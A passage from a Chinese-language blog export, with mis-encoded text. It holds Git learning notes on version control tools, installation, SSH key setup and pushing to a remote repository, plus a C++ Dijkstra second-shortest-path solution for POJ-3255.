<h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p><code>Git</code>æ˜¯ç›®å‰ä¸–ç•Œä¸Šä½¿ç”¨æœ€å¹¿æ³›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨<code>Git</code>å’Œ<code>Gitlab</code>æ­å»ºç‰ˆæœ¬æ§åˆ¶ç¯å¢ƒæ˜¯ç°åœ¨äº’è”ç½‘å…¬å¸æœ€æµè¡Œçš„ç‰ˆæœ¬æ§åˆ¶æ–¹å¼ï¼Œå…³äº<code>Git</code>ã€<code>Github</code>ã€<code>Gitlab</code>çš„å…³ç³»ï¼Œå¯ä»¥ç†è§£æˆï¼š</p>
<ul>
<li><code>Git</code>æ˜¯ä¸€ç§ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œæ˜¯ä¸€ç§å·¥å…·ï¼Œç”¨äºä»£ç çš„å­˜å‚¨å’Œç‰ˆæœ¬æ§åˆ¶ã€‚ </li>
<li><code>GitHub</code>æ˜¯ä¸€ä¸ªåŸºäºGitå®ç°çš„åœ¨çº¿ä»£ç ä»“åº“ï¼Œæ˜¯ç›®å‰å…¨çƒæœ€å¤§çš„<strong>ä»£ç æ‰˜ç®¡å¹³å°</strong>ï¼Œå¯ä»¥å¸®åŠ©ç¨‹åºå‘˜ä¹‹é—´äº’ç›¸äº¤æµå’Œå­¦ä¹ ï¼Œå³è¯¥å¹³å°å¯ä»¥ä½œä¸ºæˆ‘ä»¬å­˜æ”¾ä»£ç çš„äº‘ç«¯ã€‚ </li>
<li><code>GitLab</code>æ˜¯ä¸€ä¸ªåŸºäº<code>Git</code>å®ç°çš„åœ¨çº¿ä»£ç ä»“åº“è½¯ä»¶ï¼Œä½ å¯ä»¥ç”¨<code>GitLab</code>è‡ªå·±æ­å»ºä¸€ä¸ªç±»ä¼¼äº<code>GitHub</code>ä¸€æ ·çš„ä»“åº“ï¼Œä½†æ˜¯<code>GitLab</code>æœ‰å®Œå–„çš„ç®¡ç†ç•Œé¢å’Œæƒé™æ§åˆ¶ï¼Œä¸€èˆ¬ç”¨äºåœ¨ä¼ä¸šã€å­¦æ ¡ç­‰å†…éƒ¨ç½‘ç»œæ­å»º<code>Git</code>ç§æœã€‚</li>
</ul>
<p><code>Git</code>çš„è¯ç”Ÿï¼Œå½“å¹´ä¹Ÿæœ‰ä¸€äº›è¶£äº‹ï¼Œå¤§å®¶æ„Ÿå…´è¶£å¯ä»¥å»ç½‘ä¸Šæœç´¢ä¸€ä¸‹ï¼Œä¸å¾—ä¸èµå¹ä¸€ä¸‹ <strong>Linus Tovalds</strong> ï¼ŒçœŸå¤§ç‰›ï¼</p>
<p><code>Github</code>åœ°å€ï¼š<a href="https://github.com/git/git" target="_blank" rel="noopener">https://github.com/git/git</a><br> å®˜æ–¹ç½‘ç«™ï¼š<a href="https://git-scm.com" target="_blank" rel="noopener">https://git-scm.com/</a><br> å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://git-scm.com/docs" target="_blank" rel="noopener">https://git-scm.com/docs</a><br> ä¸­æ–‡æ–‡æ¡£ï¼š<a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a><br> ä¸‹è½½åœ°å€ï¼š<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a></p>
<h3 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h3><p><code>TortoiseSVN</code>æ˜¯ä¸€æ¬¾éå¸¸æ˜“äºä½¿ç”¨çš„è·¨å¹³å°çš„ ç‰ˆæœ¬æ§åˆ¶/ç‰ˆæœ¬æ§åˆ¶/æºä»£ç æ§åˆ¶è½¯ä»¶ã€‚å®ƒåŸºäº<a href="http://subversion.apache.org/" target="_blank" rel="noopener">Apache  Subversionï¼ˆSVNï¼‰Â®</a> ; <code>TortoiseSVN</code>ä¸º<code>Subversion</code>æä¾›äº†ä¸€ä¸ªç®€å•æ˜“ç”¨çš„ç”¨æˆ·ç•Œé¢ã€‚<br> TortoiseSVNå¼€æºåœ°å€ï¼š<a href="https://osdn.net/projects/tortoisesvn/" target="_blank" rel="noopener">https://osdn.net/projects/tortoisesvn/</a><br> Subversionçš„Githubåœ°å€ï¼š<a href="https://github.com/apache/subversion" target="_blank" rel="noopener">https://github.com/apache/subversion</a><br> å®˜æ–¹ç½‘ç«™ï¼š<a href="https://tortoisesvn.net/" target="_blank" rel="noopener">https://tortoisesvn.net/</a><br> å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://tortoisesvn.net/docs/release/TortoiseSVN_en/index.html" target="_blank" rel="noopener">https://tortoisesvn.net/docs/release/TortoiseSVN_en/index.html</a><br> ä¸­æ–‡æ–‡æ¡£ï¼š<a href="https://tortoisesvn.net/docs/release/TortoiseSVN_zh_CN/index.html" target="_blank" rel="noopener">https://tortoisesvn.net/docs/release/TortoiseSVN_zh_CN/index.html</a><br> ä¸‹è½½åœ°å€ï¼š<a href="https://tortoisesvn.net/downloads.html" target="_blank" rel="noopener">https://tortoisesvn.net/downloads.html</a></p>
<h3 id="Mercurial"><a href="#Mercurial" class="headerlink" title="Mercurial"></a><strong>Mercurial</strong></h3><p><code>Mercurial</code>æ˜¯ä¸€ä¸ªå…è´¹çš„åˆ†å¸ƒå¼æºä»£ç ç®¡ç†å·¥å…·ã€‚å®ƒå¯ä»¥æœ‰æ•ˆåœ°å¤„ç†ä»»ä½•è§„æ¨¡çš„é¡¹ç›®ï¼Œå¹¶æä¾›ç®€å•ç›´è§‚çš„ç•Œé¢ã€‚<code>Mercurial</code> æ˜¯ä¸€ç§è½»é‡çº§åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œé‡‡ç”¨ Python è¯­è¨€å®ç°ï¼Œæ˜“äºå­¦ä¹ å’Œä½¿ç”¨ï¼Œæ‰©å±•æ€§å¼ºã€‚<br> å®˜æ–¹ç½‘ç«™ï¼š<a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">https://www.mercurial-scm.org/</a><br> å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.mercurial-scm.org/wiki/BeginnersGuides" target="_blank" rel="noopener">https://www.mercurial-scm.org/wiki/BeginnersGuides</a><br> ä¸‹è½½åœ°å€ï¼š<a href="https://www.mercurial-scm.org/downloads" target="_blank" rel="noopener">https://www.mercurial-scm.org/downloads</a></p>
<h3 id="CVS"><a href="#CVS" class="headerlink" title="CVS"></a>CVS</h3><p><code>CVS</code>æ˜¯ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œæ˜¯æºé…ç½®ç®¡ç†ï¼ˆ<code>SCM</code>ï¼‰çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ä½¿ç”¨å®ƒï¼Œæ‚¨å¯ä»¥è®°å½•æºæ–‡ä»¶å’Œæ–‡æ¡£çš„å†å²è®°å½•ã€‚è€ç‰Œçš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå®ƒæ˜¯åŸºäºå®¢æˆ·ç«¯/æœåŠ¡å™¨çš„è¡Œä¸ºä½¿å¾—å…¶å¯å®¹çº³å¤šç”¨æˆ·ï¼Œæ„æˆç½‘ç»œä¹Ÿå¾ˆæ–¹ä¾¿ã€‚è¿™ä¸€ç‰¹æ€§ä½¿å¾—<code>CVS</code>æˆä¸ºä½äºä¸åŒåœ°ç‚¹çš„äººåŒæ—¶å¤„ç†æ•°æ®æ–‡ä»¶ï¼ˆç‰¹åˆ«æ˜¯ç¨‹åºçš„æºä»£ç ï¼‰æ—¶çš„é¦–é€‰ã€‚<br> å®˜æ–¹ç½‘ç«™ï¼š<a href="http://www.nongnu.org/cvs/" target="_blank" rel="noopener">http://www.nongnu.org/cvs/</a><br> å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://web.archive.org/web/20140629065005/http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs.html" target="_blank" rel="noopener">https://web.archive.org/web/20140629065005/http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs.html</a><br> ä¸‹è½½åœ°å€ï¼š<a href="https://ftp.gnu.org/non-gnu/cvs/" target="_blank" rel="noopener">https://ftp.gnu.org/non-gnu/cvs/</a></p>
<h2 id="Gitçš„å®‰è£…"><a href="#Gitçš„å®‰è£…" class="headerlink" title="Gitçš„å®‰è£…"></a>Gitçš„å®‰è£…</h2><p><code>Git</code>å‘å±•å¾ˆå¿«ï¼Œç”±æœ€åˆçš„åªèƒ½åœ¨<code>Linux</code>å’Œ<code>Unix</code>ï¼Œåæ¥äººä»¬ä¹ŸæŠŠå®ƒç§»æ¤åˆ°äº†å…¶ä»–å¹³å°ï¼Œç°åœ¨ï¼Œ<code>Git</code>å¯ä»¥åœ¨<code>Linux</code>ã€<code>Unix</code>ã€<code>Mac</code>å’Œ<code>Windows</code>è¿™å‡ å¤§å¹³å°ä¸Šæ­£å¸¸è¿è¡Œäº†ã€‚ </p>
<h3 id="åœ¨Linuxä¸Šå®‰è£…"><a href="#åœ¨Linuxä¸Šå®‰è£…" class="headerlink" title="åœ¨Linuxä¸Šå®‰è£…"></a>åœ¨Linuxä¸Šå®‰è£…</h3><p>ä»¥<code>centos 7</code>ä¸ºä¾‹ï¼ˆå½“ç„¶æœ‰äº›ç‰ˆæœ¬çš„Linuxä¼šé»˜è®¤å®‰è£…å¥½Gitï¼Œä¸è¿‡å…¶ç‰ˆæœ¬å¯èƒ½æ¯”è¾ƒæ—§ï¼‰ï¼Œé¦–å…ˆè¾“å…¥<code>git --version</code>ï¼Œå¦‚æœè¾“å‡ºç‰ˆæœ¬ä¿¡æ¯åˆ™è¯´æ˜å®‰è£…å¥½äº†ï¼Œå¦åˆ™è¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure>

<p>å®‰è£…æˆåŠŸä»¥åå†è¾“å…¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>å‡ºç°ç‰ˆæœ¬å·å³å¯ã€‚</p>
<p>å½“ç„¶äº†å¦‚æœä½ èƒ½åŠ›æ¯”è¾ƒå¼ºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æºç å®‰è£…çš„æ–¹å¼ã€‚</p>
<h3 id="åœ¨Windowsä¸Šé¢å®‰è£…"><a href="#åœ¨Windowsä¸Šé¢å®‰è£…" class="headerlink" title="åœ¨Windowsä¸Šé¢å®‰è£…"></a>åœ¨Windowsä¸Šé¢å®‰è£…</h3><p>Windowså¹³å°ä¸Šé¢å®‰è£…æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦åˆ°<a href>å®˜ç½‘ä¸‹è½½</a>é¡µé¢ä¸Šä¸‹è½½åˆé€‚çš„ç‰ˆæœ¬å³å¯ï¼Œä¾‹å¦‚æˆ‘ä¸‹è½½çš„æ˜¯â€Standalone Installerâ€çš„<code>64bit</code>ç‰ˆæœ¬çš„ã€‚</p>
<p>è·å–äºŒè¿›åˆ¶å®‰è£…åŒ…åï¼ŒåŒå‡»å¹¶é»˜è®¤å…¶è®¾ç½®ï¼Œä¸æ–­ç‚¹å‡»<code>Next</code>å³å¯ã€‚</p>
<p>å®‰è£…å®Œæ¯•é¼ æ ‡å³é”®é¼ æ ‡ï¼Œåº”è¯¥å¯ä»¥çœ‹å¾—åˆ°èœå•ä¸­å‡ºç°å…³äº<code>Git</code>çš„é€‰é¡¹</p>
<p><img src="https://qiniu.yalexin.top/right.jpg" alt></p>
<p>ç‚¹å‡»â€Git Bash Hereâ€è¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>å‡ºç°ç‰ˆæœ¬å·å³å¯ï¼ˆå½“ç„¶ï¼Œä½¿ç”¨<code>Windows</code>è‡ªå¸¦çš„å‘½ä»¤æç¤ºç¬¦æ‰“å¼€å‘½ä»¤çª—å£è¾“å…¥ä¸Šè¿°å‘½ä»¤ä¹Ÿå¯ï¼‰</p>
<p>ä¸ºæ–¹ä¾¿ä½¿ç”¨ï¼Œæœ¬ç¬”è®°ä»¥<code>Windows</code>ç‰ˆæœ¬å±•å¼€ï¼Œå½“ç„¶åé¢ä¹Ÿä¼šç©¿æ’ä¸€äº›<code>Linux</code>ç‰ˆæœ¬çš„ä½¿ç”¨ã€‚</p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå’Œè¿œç¨‹ä»“åº“å»ºç«‹è¿æ¥</title>
    <url>/2020/04/06/Git%E5%92%8C%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<p>ä»Šå¤©å› ä¸ºä¸€äº›ä¸å¯æŠ—åŠ›å› ç´ é‡è£…äº†ç³»ç»Ÿï¼Œå‘ç°<code>git</code>ç¯å¢ƒä¸¢å¤±äº†ï¼Œå°±ä¸å¾—ä¸é‡æ–°é…ç½®ä¸€ä¸‹<code>git</code>ï¼Œé¡ºä¾¿æŠŠè¿‡ç¨‹å†™ä¸‹æ¥å§ã€‚</p>
<h2 id="gitä¸‹è½½å®‰è£…"><a href="#gitä¸‹è½½å®‰è£…" class="headerlink" title="gitä¸‹è½½å®‰è£…"></a>gitä¸‹è½½å®‰è£…</h2><p>å®‰è£…è¿‡ç¨‹ç›´æ¥é»˜è®¤ï¼Œä¸€ç›´<code>next</code>å°±å¯ä»¥äº†ã€‚<a id="more"></a></p>
<h2 id="ä»£ç æ‰˜ç®¡å¹³å°è´¦å·æ³¨å†Œ"><a href="#ä»£ç æ‰˜ç®¡å¹³å°è´¦å·æ³¨å†Œ" class="headerlink" title="ä»£ç æ‰˜ç®¡å¹³å°è´¦å·æ³¨å†Œ"></a>ä»£ç æ‰˜ç®¡å¹³å°è´¦å·æ³¨å†Œ</h2><p><code>git</code>ä¸‹è½½å®‰è£…æœŸé—´åˆ°ç¬¬ä¸‰æ–¹ä»£ç æ‰˜ç®¡å¹³å°æ³¨å†Œè´¦æˆ·ï¼Œå¼€å¯ä¸€ä¸ªè¿œç¨‹ä»“åº“ï¼Œè®°ä½è¯¥è¿œç¨‹ä»“åº“çš„é“¾æ¥ã€‚</p>
<p>ä»¥ç äº‘ä¸ºä¾‹ï¼š</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586182061136.png" alt="ä»“åº“æˆªå›¾"></p>
<h2 id="è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±"><a href="#è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±" class="headerlink" title="è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±"></a>è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±</h2><p>åœ¨<code>cmd</code>å‘½ä»¤è¡Œæˆ–è€…ç”¨å®‰è£…<code>git</code>æ—¶è‡ªå¸¦çš„<code>Git bash</code>è¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "æ ¹æ®è‡ªå·±å–œå¥½è¿›è¡Œè®¾ç½®ç”¨æˆ·å" </span><br><span class="line">git config --global user.email "è‡ªå·±å¸¸ç”¨çš„é‚®ç®±"</span><br></pre></td></tr></table></figure>

<h2 id="ç”Ÿæˆå¯†é’¥"><a href="#ç”Ÿæˆå¯†é’¥" class="headerlink" title="ç”Ÿæˆå¯†é’¥"></a>ç”Ÿæˆå¯†é’¥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "è¿™é‡Œæ¢ä¸Šä½ çš„é‚®ç®±"</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™æ¡å‘½ä»¤åœ¨<code>cmd</code>å‘½ä»¤è¡Œä¸‹å¯èƒ½ä¼šå¤±è´¥ï¼Œç”¨å®‰è£…<code>git</code>æ—¶è‡ªå¸¦çš„<code>Git bash</code>å°±å¯ä»¥æˆåŠŸäº†ï¼Œç„¶åæŒ‰ç…§æç¤ºæŒ‰ä¸‹ä¸‰æ¬¡å›è½¦ã€‚</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586182931481.png" alt="å¯†é’¥å›¾ç‰‡"></p>
<h2 id="ç¬¬ä¸‰æ–¹å¹³å°æ·»åŠ å¯†é’¥"><a href="#ç¬¬ä¸‰æ–¹å¹³å°æ·»åŠ å¯†é’¥" class="headerlink" title="ç¬¬ä¸‰æ–¹å¹³å°æ·»åŠ å¯†é’¥"></a>ç¬¬ä¸‰æ–¹å¹³å°æ·»åŠ å¯†é’¥</h2><p>å°†ä¸Šè¿°ç”Ÿæˆçš„<code>/c/Users/YaleXin/.ssh/id_rsa.pub</code>æ–‡ä»¶ä¸­çš„å†…å®¹å¤åˆ¶ï¼Œæ‰“å¼€ç äº‘ï¼Œåœ¨è®¾ç½® â€“&gt;SSHå…¬é’¥å¤„ç²˜è´´æ‰€å¤åˆ¶çš„å†…å®¹ã€‚</p>
<h2 id="åˆå§‹åŒ–æœ¬åœ°ä»“åº“"><a href="#åˆå§‹åŒ–æœ¬åœ°ä»“åº“" class="headerlink" title="åˆå§‹åŒ–æœ¬åœ°ä»“åº“"></a>åˆå§‹åŒ–æœ¬åœ°ä»“åº“</h2><p>åœ¨éœ€è¦çš„åœ°æ–¹åœ°æ–¹æ‰“å¼€<code>Git bash</code>ï¼Œè¾“å…¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>



<h2 id="å°†æœ¬åœ°ä¿®æ”¹æäº¤åˆ°è¿œç¨‹ä»“åº“"><a href="#å°†æœ¬åœ°ä¿®æ”¹æäº¤åˆ°è¿œç¨‹ä»“åº“" class="headerlink" title="å°†æœ¬åœ°ä¿®æ”¹æäº¤åˆ°è¿œç¨‹ä»“åº“"></a>å°†æœ¬åœ°ä¿®æ”¹æäº¤åˆ°è¿œç¨‹ä»“åº“</h2><p>éšä¾¿ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æ–°å»ºä¸€ä¸ª<code>test.txt</code>ï¼Œç„¶ååœ¨<code>Git bash</code>è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼š</p>
<p>æš‚å­˜æ›´æ”¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>

<p>æäº¤æ›´æ”¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m "ä½ çš„æäº¤å¤‡æ³¨"</span><br></pre></td></tr></table></figure>

<p>è¿æ¥è¿œç¨‹ä»“åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin ä½ çš„è¿œç¨‹ä»“åº“åœ°å€</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨<code>HTTPS</code>æˆ–è€…<code>SSH</code>çš„æ–¹å¼ã€‚</p>
<p>ä»è¿œç¨‹ä»“åº“æ‹‰å–ï¼ˆè‹¥è¿œç¨‹ä»“åº“æ²¡æœ‰ä»»ä½•æ•°æ®ï¼Œå¯ä»¥è·³è¿‡è¿™ä¸ªæ­¥éª¤ï¼Œå¦åˆ™è¾“å…¥ï¼šï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>æ¨é€åˆ°è¿œç«¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„å‘½ä»¤æ˜¯ç¬¬ä¸€æ¬¡æäº¤çš„æ—¶å€™ä½¿ç”¨çš„å‘½ä»¤ï¼Œå‡å¦‚æ˜¯éç¬¬ä¸€æ¬¡ï¼Œç›´æ¥ä½¿ç”¨<code>git push</code>å³å¯</p>
]]></content>
      <categories>
        <category>æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstraç®—æ³•å®ç°æ¬¡çŸ­è·¯</title>
    <url>/2020/12/06/Dijkstra%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%AC%A1%E7%9F%AD%E8%B7%AF/</url>
    <content><![CDATA[<p>Dijkstraå¯ä»¥ç”¨äºæ±‚è§£æœ€çŸ­è·¯é—®é¢˜ï¼Œå®é™…ä¸Šè¯¥ç®—æ³•ä¹Ÿå¯ä»¥å®ç°æ¬¡çŸ­è·¯ï¼Œæ›´ä¸€èˆ¬çš„ï¼Œè¯¥ç®—æ³•å¯ä»¥å®ç°ç¬¬kçŸ­è·¯</p>
<h2 id="æ¨¡ç‰ˆ"><a href="#æ¨¡ç‰ˆ" class="headerlink" title="æ¨¡ç‰ˆ"></a>æ¨¡ç‰ˆ</h2><p>é¢˜ç›®ï¼š<a href="http://poj.org/problem?id=3255" target="_blank" rel="noopener">POJ-3255</a></p>
<h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><a id="more"></a>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">5001</span>, INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="comment">// åˆ†åˆ«å­˜æ”¾0å·èŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹çš„æœ€çŸ­è·ç¦»ã€æ¬¡çŸ­è·ç¦»</span></span><br><span class="line"><span class="keyword">int</span> dist1[MAX_N], dist2[MAX_N];</span><br><span class="line"><span class="keyword">int</span> n, r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> adj, cost;</span><br><span class="line">    Edge(<span class="keyword">int</span> adj, <span class="keyword">int</span> cost) &#123;<span class="keyword">this</span>-&gt;adj = adj, <span class="keyword">this</span> -&gt; cost = cost;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªä»£è¡¨è·ç¦»ã€ç¬¬äºŒä¸ªä»£è¡¨åç»§èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="built_in">vector</span>&lt;Edge&gt; nodeEdges[MAX_N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addEdge</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> cost)</span> </span>&#123;</span><br><span class="line">    nodeEdges[u].push_back(Edge(v, cost));</span><br><span class="line">    nodeEdges[v].push_back(Edge(u, cost));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Dijkstra æ€æƒ³</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="comment">// è·ç¦»å°çš„Pä¼˜å…ˆçº§é«˜</span></span><br><span class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; myQueue; </span><br><span class="line">    <span class="built_in">fill</span>(dist1, dist1 + n, INF);</span><br><span class="line">    <span class="built_in">fill</span>(dist2, dist2 + n, INF);</span><br><span class="line">    dist1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    myQueue.push(P(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> (!myQueue.empty()) &#123;</span><br><span class="line">        P top = myQueue.top();</span><br><span class="line">        myQueue.pop();</span><br><span class="line">        <span class="keyword">int</span> adjNode = top.second, dist = top.first;</span><br><span class="line">        <span class="keyword">if</span> (dist2[adjNode] &lt; dist)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nodeEdges[adjNode].<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            Edge edge = nodeEdges[adjNode][i];</span><br><span class="line">            <span class="keyword">int</span> toNodeDist = dist + edge.cost;</span><br><span class="line">            <span class="comment">// æ›´æ–°æœ€çŸ­è·ç¦»</span></span><br><span class="line">            <span class="keyword">if</span> (toNodeDist &lt; dist1[edge.adj]) &#123;</span><br><span class="line">                swap(dist1[edge.adj], toNodeDist);</span><br><span class="line">                myQueue.push(P(dist1[edge.adj], edge.adj));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// æ›´æ–°æ¬¡çŸ­è·ç¦»</span></span><br><span class="line">            <span class="keyword">if</span> (dist2[edge.adj] &gt; toNodeDist &amp;&amp; dist1[edge.adj] &lt; toNodeDist) &#123;</span><br><span class="line">                dist2[edge.adj] = toNodeDist;</span><br><span class="line">                myQueue.push(P(dist2[edge.adj], edge.adj));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dist2[n - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">        addEdge(u - <span class="number">1</span>, v - <span class="number">1</span>, w);</span><br><span class="line">    &#125;</span><br><span class="line">    solve();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æœ€çŸ­è·¯</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå­¦ä¹ ç¬”è®°ä¹‹GitåŸºæœ¬æ“ä½œ</title>
    <url>/2022/02/08/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>ä¹¦æ¥ä¸Šå›ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»<code>Git</code>çš„ç®€å•æ—¥å¸¸æ“ä½œã€‚</p>
<h2 id="åˆ›å»ºæœ¬åœ°ä»“åº“"><a href="#åˆ›å»ºæœ¬åœ°ä»“åº“" class="headerlink" title="åˆ›å»ºæœ¬åœ°ä»“åº“"></a>åˆ›å»ºæœ¬åœ°ä»“åº“</h2><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆé…ç½®ä»¥ä¸‹æˆ‘ä»¬çš„è´¦æˆ·ä¿¡æ¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"Your Email"</span></span></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å› ä¸º<code>Git</code>æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ï¼Œæ¯æ¬¡çš„æäº¤éƒ½éœ€è¦è®°ä¸‹æäº¤è€…çš„ä¿¡æ¯ã€‚</p>
<a id="more"></a>

<p><code>--global</code>æ„æ€æ˜¯é…ç½®çš„æ˜¯å…¨å±€ç”¨æˆ·ï¼Œè¿™æ ·å­æˆ‘ä»¬å°±ä¸éœ€è¦æ¯ä¸ªä»“åº“éƒ½é…ç½®ç”¨æˆ·ä¿¡æ¯äº†ã€‚</p>
<p>ä¾‹å¦‚æˆ‘çš„ä¿¡æ¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "YaleXin"</span><br><span class="line">git config --global user.email "495592364@qq.com"</span><br></pre></td></tr></table></figure>

